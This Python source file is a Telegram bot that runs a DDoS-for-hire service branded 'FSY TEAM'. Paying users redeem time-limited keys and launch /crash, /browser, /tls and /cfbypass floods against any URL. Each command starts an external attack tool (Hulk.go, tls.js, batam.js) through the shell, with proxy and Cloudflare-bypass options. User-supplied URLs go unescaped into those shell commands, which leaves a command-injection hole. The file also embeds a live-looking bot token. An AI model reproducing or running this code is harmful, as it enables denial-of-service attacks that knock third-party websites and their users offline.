import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import json
import os
import time
import re
import random
import string
import datetime
import threading
import subprocess
import socket
import sys
from concurrent.futures import ThreadPoolExecutor
import requests

# Thread pool for async HTTP requests
executor = ThreadPoolExecutor(max_workers=10)

# --- CONFIGURATION ---
TOKEN = '7389579208:AAFclzuZBeb_rtz992WE51LpZygg6iZ8bU0'
bot = telebot.TeleBot(TOKEN)

CHANNEL_INVITE = "https://t.me/DDoS1115"
owners = [7993202287,7186543886]
KEY_FILE = 'keys.json'
DATA = {}
ALL_USERS = set()  # Track ALL bot users for broadcast

# Active attacks and logs
active_attacks = {}
attack_logs = []
blocked_sites = ["kuropanel.net", "k-mod.shop"]
cooldowns = {}
COOLDOWN_SECONDS = 60
USERS_FILE = 'all_users.json'

# --- DATA MANAGEMENT ---
def load_data():
    global DATA
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, 'r') as f:
            try:
                DATA = json.load(f)
            except json.JSONDecodeError:
                DATA = {"keys": {}, "sessions": {}}
    else:
        DATA = {"keys": {}, "sessions": {}}
    DATA.setdefault("keys", {})
    DATA.setdefault("sessions", {})

def load_users():
    global ALL_USERS
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, 'r') as f:
                ALL_USERS = set(json.load(f))
        except:
            ALL_USERS = set()
    else:
        ALL_USERS = set()

def save_users():
    try:
        with open(USERS_FILE, 'w') as f:
            json.dump(list(ALL_USERS), f)
    except:
        pass

def save_data():
    with open(KEY_FILE, 'w') as f:
        json.dump(DATA, f, indent=2)

load_data()
load_users()

# --- HELPER FUNCTIONS ---
def is_owner(user_id):
    return user_id in owners

def is_logged_in(user_id):
    return user_id in DATA['sessions']

def check_key_valid(key):
    return key in DATA['keys'] and DATA['keys'][key]['expireAt'] > int(time.time() * 1000)

def attack_key(chat_id, message_id):
    return f"{chat_id}_{message_id}"

def get_user_name(user):
    return user.username or user.first_name or "User"

def is_cooldown(user_id):
    last = cooldowns.get(user_id, 0)
    return (time.time() - last) < COOLDOWN_SECONDS

def update_cooldown(user_id):
    cooldowns[user_id] = time.time()

def track_user(user_id):
    ALL_USERS.add(user_id)
    save_users()

def get_host(url):
    return re.sub(r'^https?://', '', url).split('/')[0]

def get_root_domain(host):
    parts = host.split('.')
    if len(parts) <= 2:
        return host
    return '.'.join(parts[-2:])

def is_blocked(url):
    return any(get_root_domain(get_host(url)) == domain for domain in blocked_sites)

def resolve_url_info(url):
    hostname = get_host(url)
    ip, isp, country = "Unknown", "Unknown", "Unknown"
    try:
        ip = socket.getaddrinfo(hostname, 80)[0][4][0]
    except (socket.gaierror, IndexError):
        return {"ip": "Unknown", "isp": "Unknown", "country": "Unknown"}

    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if res.status_code == 200:
            data = res.json()
            isp = data.get("isp", "Unknown")
            country = data.get("country", "Unknown")
    except Exception:
        pass
    return {"ip": ip, "isp": isp, "country": country}

def format_attack_message(url, method, duration, isp, ip, country):
    now = datetime.datetime.now().strftime("%H:%M:%S")
    method_display = {
        'CRASH': 'CRASH', 
        'TLS': 'TLS', 
        'BROWSER': 'BROWSER', 
        'CFBYPASS': '☁️ CF BYPASS'
    }.get(method, method)
    return f"""╔══════════════════════╗
║       ATTACK LAUNCHED      ║
╚══════════════════════╝

🎯 Target: {url}
⚙️ Method: {method_display}
⏳ Duration: {duration}s
🏢 ISP: {isp}
📡 IP: {ip}
🌍 Country: {country}
🕒 Started: {now}

🤖 Powered by FSY TEAM
👑 Owner: @ToMmY2617"""

# 🚨 GLOBAL BROADCAST FUNCTION
def broadcast_message(text):
    success = 0
    failed = 0
    total = len(ALL_USERS)
    
    status_msg = bot.send_message(owners[0], f"📢 Broadcasting to {total} users...")
    
    for user_id in list(ALL_USERS):
        try:
            bot.send_message(user_id, f"🚨 **ALERT**\n\n{text}", parse_mode='Markdown')
            success += 1
        except:
            failed += 1
        threading.Event().wait(0.05)
        
        if success % 100 == 0:
            bot.edit_message_text(
                f"📢 Broadcasting... {success}/{total} ({success/(success+failed)*100:.1f}%)",
                owners[0], status_msg.message_id
            )
    
    result = f"✅ **BROADCAST COMPLETE**\n📢 Total: {total}\n✅ Success: {success}\n❌ Failed: {failed}\n📊 Rate: {success/(success+failed)*100:.1f}%"
    bot.edit_message_text(result, owners[0], status_msg.message_id, parse_mode='Markdown')
    return result

# --- AUTO-EXPIRE KEYS ---
def key_expiration_monitor():
    while True:
        now = int(time.time() * 1000)
        changed = False
        keys_to_delete = []
        
        for key, details in list(DATA.get('keys', {}).items()):
            if details.get('expireAt', 0) < now:
                if details.get('usedBy'):
                    user_id = details['usedBy']
                    if user_id in DATA.get('sessions', {}):
                        del DATA['sessions'][user_id]
                        try:
                            bot.send_message(user_id, "⏳ Your key has expired. You have been logged out automatically.")
                        except:
                            pass
                keys_to_delete.append(key)
                changed = True
        
        for key in keys_to_delete:
            del DATA['keys'][key]
            
        if changed:
            save_data()
        
        time.sleep(60)

threading.Thread(target=key_expiration_monitor, daemon=True).start()

# --- COMMAND HANDLERS ---
@bot.message_handler(commands=['start'])
def handle_start(message):
    track_user(message.from_user.id)
    username = get_user_name(message.from_user)
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("Join My Channel", url=CHANNEL_INVITE))
    bot.send_message(message.chat.id, 
                     f"👋 Welcome to FSY TEAM / TOMMY DDoS BOT, {username}!\n\nPlease join our channel first to continue.", 
                     reply_markup=markup)

@bot.message_handler(regexp=r'^/login\s+(.+)$', content_types=['text'])
def handle_login(message):
    track_user(message.from_user.id)
    chat_id = message.chat.id
    if message.text.count(' ') < 1:
        return bot.send_message(chat_id, "❌ Usage: /login <key>")
    
    key = message.text.split(maxsplit=1)[1].strip()
    username = get_user_name(message.from_user)

    if not check_key_valid(key):
        return bot.send_message(chat_id, "❌ Invalid or expired key.")

    if DATA['keys'][key].get('usedBy') and DATA['keys'][key]['usedBy'] != chat_id:
        return bot.send_message(chat_id, "❌ This key is already used by another user.")

    DATA['sessions'][chat_id] = {"key": key, "loginAt": int(time.time() * 1000)}
    DATA['keys'][key]['usedBy'] = chat_id
    save_data()
    bot.send_message(chat_id, f"✅ Logged in successfully, {username}!")

@bot.message_handler(commands=['help'])
def handle_help(message):
    chat_id = message.chat.id
    username = get_user_name(message.from_user)
    
    if not (is_logged_in(chat_id) or is_owner(chat_id)):
        return bot.send_message(chat_id, "❌ Login with key first to see commands.")

    if is_owner(chat_id):
        text = """
⚡ Owner Commands:
  /gen <hours>       → Generate new key
  /removekey <key>   → Remove a key
  /keys              → Show all keys
  /broadcast <text>  → Alert ALL users
⚡ Attack Commands:
  /login <keys>
  /crash <url> <GET|POST> <duration>
  /browser <url> <duration> <threads>
  /tls <url> <duration> <rate?> <threads?> <proxyFile?>
  /cfbypass <url> <duration> <proxy.txt> <threads> <rps>
"""
    else:
        text = f"""👤 User: {username}\n🤖 DDOS ATTACK BY FSY TEAM\n\n⚡ Available Commands:\n 
/login <key> 
/crash <url> <GET|POST> <duration>
/browser <url> <duration> <threads>
/tls <url> <duration> <rate?> <threads?> <proxyFile?>
/cfbypass <url> <duration> <proxy.txt> <threads> <rps>"""
    bot.send_message(chat_id, text)

@bot.message_handler(regexp=r'^/gen\s+(\d+)$', content_types=['text'])
def handle_gen(message):
    chat_id = message.chat.id
    if not is_owner(chat_id):
        return
    try:
        hours = int(message.text.split(maxsplit=1)[1].strip())
    except ValueError:
        return bot.send_message(chat_id, "❌ Usage: /gen <hours>")
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    expires_at = int(time.time() * 1000) + hours * 3600000
    DATA['keys'][key] = {"expireAt": expires_at, "usedBy": None}
    save_data()
    bot.send_message(chat_id, f"✅ Key generated:\n`{key}`\nExpires in: {hours} hour(s)", parse_mode='Markdown')

@bot.message_handler(regexp=r'^/removekey\s+(.+)$', content_types=['text'])
def handle_removekey(message):
    chat_id = message.chat.id
    if not is_owner(chat_id):
        return
    try:
        key = message.text.split(maxsplit=1)[1].strip()
    except IndexError:
        return bot.send_message(chat_id, "❌ Usage: /removekey <key>")
    if key in DATA['keys']: 
        used_by = DATA['keys'][key].get('usedBy')
        if used_by and used_by in DATA['sessions']:
            del DATA['sessions'][used_by]
        del DATA['keys'][key] 
        save_data() 
        bot.send_message(chat_id, f"✅ Key `{key}` removed.", parse_mode='Markdown') 
    else:
        bot.send_message(chat_id, "❌ Key not found.")

@bot.message_handler(commands=['keys'])
def handle_keys(message):
    chat_id = message.chat.id
    if not is_owner(chat_id):
        return
    text = "🔑 Active Keys:\n\n"
    keyboard = []
    for key, details in DATA.get('keys', {}).items():
        expire_date = datetime.datetime.fromtimestamp(details['expireAt'] / 1000).strftime('%Y-%m-%d %H:%M:%S')
        used_by = f"(Used by: {details['usedBy']})" if details.get('usedBy') else ''
        text += f"`{key}` {used_by} - Exp: {expire_date}\n"
        keyboard.append([InlineKeyboardButton(f"Remove {key}", callback_data=f"removekey_{key}")])
    if not DATA['keys']:
        text = "No active keys."
    bot.send_message(chat_id, text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

# 🚨 BROADCAST COMMAND - ALL BOT USERS
@bot.message_handler(commands=['broadcast'])
def handle_broadcast(message):
    chat_id = message.chat.id
    if not is_owner(chat_id):
        return bot.send_message(chat_id, "❌ Owner only!")
    
    if len(message.text.split()) < 2:
        return bot.send_message(chat_id, "❌ Usage: `/broadcast Your message here`")
    
    broadcast_text = message.text[11:].strip()
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🚨 SEND TO ALL USERS", callback_data=f"confirm_broadcast_{len(attack_logs)}"))
    markup.add(InlineKeyboardButton("❌ Cancel", callback_data="cancel_broadcast"))
    
    bot.send_message(chat_id, f"📢 **CONFIRM BROADCAST** (to {len(ALL_USERS)} users)\n\n`{broadcast_text}`", 
                    reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data.startswith('confirm_broadcast_'))
def confirm_broadcast(call):
    if not is_owner(call.from_user.id):
        return
    broadcast_message("🚨 GLOBAL ALERT - Check bot updates!")  # Customize text
    bot.answer_callback_query(call.id, "📢 Broadcast sent!")

@bot.callback_query_handler(func=lambda call: call.data == 'cancel_broadcast')
def cancel_broadcast(call):
    bot.answer_callback_query(call.id, "❌ Cancelled")

@bot.callback_query_handler(func=lambda call: call.data.startswith('removekey_'))
def handle_removekey_callback(call):
    chat_id = call.message.chat.id
    msg_id = call.message.message_id
    key = call.data.replace('removekey_', '')
    if not is_owner(chat_id):
        return bot.answer_callback_query(call.id, "❌ You are not allowed.")
    if key in DATA['keys']:
        used_by = DATA['keys'][key].get('usedBy')
        if used_by and used_by in DATA['sessions']:
            del DATA['sessions'][used_by]
        del DATA['keys'][key]
        save_data()
        bot.edit_message_text(f"✅ Key `{key}` removed.", chat_id, msg_id, parse_mode='Markdown')
    else:
        bot.answer_callback_query(call.id, "❌ Key not found.")

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_'))
def handle_stop_attack_callback(call):
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    key = attack_key(chat_id, message_id)
    if key in active_attacks:
        process = active_attacks[key]
        try:
            process.terminate()
            process.wait(timeout=1)
        except:
            pass
        finally:
            if key in active_attacks:
                del active_attacks[key]
        bot.edit_message_text("🛑 Attack stopped by user.", chat_id, message_id)
    bot.answer_callback_query(call.id, "Attack stopped.")

@bot.message_handler(commands=['logout'])
def handle_logout(message):
    chat_id = message.chat.id
    if not is_logged_in(chat_id):
        return bot.send_message(chat_id, "❌ You are not logged in.")
    key = DATA['sessions'][chat_id]['key']
    del DATA['sessions'][chat_id]
    if key in DATA['keys']:
        DATA['keys'][key]['usedBy'] = None
    save_data()
    bot.send_message(chat_id, "✅ Logged out.")

def run_attack_and_monitor(chat_id, message_id, url, method, initial_duration, cmd, attack_type):
    key = attack_key(chat_id, message_id)
    current_duration = initial_duration
    info = resolve_url_info(url)
    ip, isp, country = info['ip'], info['isp'], info['country']

    try:
        process = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid)
        active_attacks[key] = process
        attack_logs.append(f"[{attack_type}] {url} by {chat_id} for {initial_duration}s")
    except Exception as e:
        if key in active_attacks:
            del active_attacks[key]
        bot.send_message(chat_id, f"❌ Failed to start: {e}")
        return

    while current_duration > 0 and key in active_attacks:
        time.sleep(1)
        current_duration -= 1
        try:
            opts = InlineKeyboardMarkup()
            opts.add(InlineKeyboardButton('🛑 Stop Attack', callback_data=f"stop_{chat_id}_{message_id}"))
            bot.edit_message_text(format_attack_message(url, attack_type, current_duration, isp, ip, country), 
                                  chat_id, message_id, reply_markup=opts)
        except:
            pass

    if key in active_attacks:
        process = active_attacks[key]
        try:
            process.terminate()
            process.wait(timeout=1)
        except:
            pass
        finally:
            if key in active_attacks:
                del active_attacks[key]
    try:
        bot.delete_message(chat_id, message_id)
    except:
        pass
    bot.send_message(chat_id, f"✅ {attack_type} finished on {url}")

# --- ATTACK HANDLERS ---
@bot.message_handler(regexp=r'^/crash\s+(\S+)\s+(GET|POST)\s+(\d+)$', content_types=['text'])
def handle_crash(message):
    track_user(message.from_user.id)
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not (is_owner(user_id) or is_logged_in(chat_id)):
        return bot.send_message(chat_id, '❌ You are not allowed.')
    if not is_owner(user_id) and is_cooldown(user_id):
        return bot.send_message(chat_id, f'⏱ Max {COOLDOWN_SECONDS}s cooldown.')

    match = re.match(r'^/crash\s+(\S+)\s+(GET|POST)\s+(\d+)$', message.text, re.IGNORECASE)
    url, method, duration_str = match.groups()
    duration = int(duration_str)

    if is_blocked(url):
        return bot.send_message(chat_id, '🚫 Site protected.')
    if not is_owner(user_id) and duration > 300:
        return bot.send_message(chat_id, '⚠️ Max 300s for users.')

    update_cooldown(user_id)
    opts = InlineKeyboardMarkup()
    opts.add(InlineKeyboardButton('🛑 Stop Attack', callback_data=f"stop_{chat_id}_{message.id}"))
    sent = bot.send_message(chat_id, format_attack_message(url, 'CRASH', duration, "Resolving...", "Looking up...", "Unknown"), reply_markup=opts)
    
    cmd = f"timeout {duration}s go run Hulk.go -site {url} -data {method}"
    threading.Thread(target=run_attack_and_monitor, args=(chat_id, sent.message_id, url, 'CRASH', duration, cmd, 'CRASH'), daemon=True).start()

@bot.message_handler(regexp=r'^/browser\s+(\S+)\s+(\d+)(?:\s+(\d+))?$', content_types=['text'])
def handle_browser(message):
    track_user(message.from_user.id)
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not (is_owner(user_id) or is_logged_in(chat_id)):
        return bot.send_message(chat_id, '❌ You are not allowed.')
    if not is_owner(user_id) and is_cooldown(user_id):
        return bot.send_message(chat_id, f'⏱ Max {COOLDOWN_SECONDS}s cooldown.')

    match = re.match(r'^/browser\s+(\S+)\s+(\d+)(?:\s+(\d+))?$', message.text, re.IGNORECASE)
    groups = match.groups()
    url, duration_str, threads_str = groups[0], groups[1], groups[2]
    duration = int(duration_str)
    threads = int(threads_str) if threads_str else 10

    if not is_owner(user_id):
        if duration > 300: return bot.send_message(chat_id, '⚠️ Max 300s.')
        if threads > 10: threads = 10

    update_cooldown(user_id)
    if is_blocked(url):
        return bot.send_message(chat_id, '🚫 Site protected.')

    opts = InlineKeyboardMarkup()
    opts.add(InlineKeyboardButton('🛑 Stop Attack', callback_data=f"stop_{chat_id}_{message.id}"))
    sent = bot.send_message(chat_id, format_attack_message(url, 'BROWSER', duration, "Resolving...", "Looking up...", "Unknown"), reply_markup=opts)
    
    cmd = f"timeout {duration}s node browser.js {url} {duration} {threads}"
    threading.Thread(target=run_attack_and_monitor, args=(chat_id, sent.message_id, url, 'BROWSER', duration, cmd, 'BROWSER'), daemon=True).start()

@bot.message_handler(regexp=r'^/tls\s+(\S+)\s+(\d+)(?:\s+(\d+))?(?:\s+(\d+))?(?:\s+(\S+))?$', content_types=['text'])
def handle_tls(message):
    track_user(message.from_user.id)
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not (is_owner(user_id) or is_logged_in(chat_id)):
        return bot.send_message(chat_id, '❌ You are not allowed.')
    if not is_owner(user_id) and is_cooldown(user_id):
        return bot.send_message(chat_id, f'⏱ Max {COOLDOWN_SECONDS}s cooldown.')

    match = re.match(r'^/tls\s+(\S+)\s+(\d+)(?:\s+(\d+))?(?:\s+(\d+))?(?:\s+(\S+))?$', message.text, re.IGNORECASE)
    groups = match.groups()
    url, duration_str, rate_str, threads_str, proxy_str = groups[0], groups[1], groups[2], groups[3], groups[4]
    duration = int(duration_str)
    rate = int(rate_str) if rate_str else 32
    threads = int(threads_str) if threads_str else 3
    proxy_file = proxy_str if proxy_str else 'none'

    if not is_owner(user_id):
        duration = min(duration, 300)
        rate = min(rate, 32)
        threads = min(threads, 3)

    update_cooldown(user_id)
    if is_blocked(url):
        return bot.send_message(chat_id, '🚫 Site protected.')

    opts = InlineKeyboardMarkup()
    opts.add(InlineKeyboardButton('🛑 Stop Attack', callback_data=f"stop_{chat_id}_{message.id}"))
    sent = bot.send_message(chat_id, format_attack_message(url, 'TLS', duration, "Resolving...", "Looking up...", "Unknown"), reply_markup=opts)
    
    cmd = f"timeout {duration}s node tls.js {url} {duration} {rate} {threads} {proxy_file}"
    threading.Thread(target=run_attack_and_monitor, args=(chat_id, sent.message_id, url, 'TLS', duration, cmd, 'TLS'), daemon=True).start()

# 🔥 NEW CF BYPASS
@bot.message_handler(regexp=r'^/cfbypass\s+(https?://[^\s]+)\s+(\d+)\s+(\S+)\s+(\d+)\s+(\d+)$')
def handle_cfbypass(message):
    track_user(message.from_user.id)
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not (is_owner(user_id) or is_logged_in(chat_id)):
        return bot.send_message(chat_id, '❌ You are not allowed.')
    if not is_owner(user_id) and is_cooldown(user_id):
        return bot.send_message(chat_id, f'⏱ Max {COOLDOWN_SECONDS}s cooldown.')

    match = re.match(r'^/cfbypass\s+(https?://[^\s]+)\s+(\d+)\s+(\S+)\s+(\d+)\s+(\d+)$', message.text)
    if not match:
        return bot.send_message(chat_id, "❌ Usage: `/cfbypass <url> <duration> <proxy.txt> <threads> <rps>`")
    
    url, duration_str, proxy_file, threads_str, rps_str = match.groups()
    duration = int(duration_str)
    threads = int(threads_str)
    rps = int(rps_str)

    if not os.path.exists(proxy_file):
        return bot.send_message(chat_id, f"❌ Proxy file `{proxy_file}` not found!")

    if not is_owner(user_id):
        if duration > 300 or threads > 20 or rps > 200:
            return bot.send_message(chat_id, '⚠️ Max: 300s/20threads/200rps')

    update_cooldown(user_id)
    if is_blocked(url):
        return bot.send_message(chat_id, '🚫 Site protected.')

    opts = InlineKeyboardMarkup()
    opts.add(InlineKeyboardButton('🛑 Stop Attack', callback_data=f"stop_{chat_id}_{message.id}"))
    sent = bot.send_message(chat_id, format_attack_message(url, 'CFBYPASS', duration, "CloudFlare", "Bypassing...", "🔥"), reply_markup=opts)
    
    cmd = f"timeout {duration}s node batam.js {url} {duration} {proxy_file} {threads} {rps}"
    threading.Thread(target=run_attack_and_monitor, args=(chat_id, sent.message_id, url, 'CFBYPASS', duration, cmd, '☁️🔥 CF-BYPASS'), daemon=True).start()

if __name__ == '__main__':
    print("🤖 FSY DDoS Bot + CF Bypass + Global Broadcast Started!")
    print(f"📊 Tracking {len(ALL_USERS)} users")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Error: {e}")
    print("Bot stopped.")
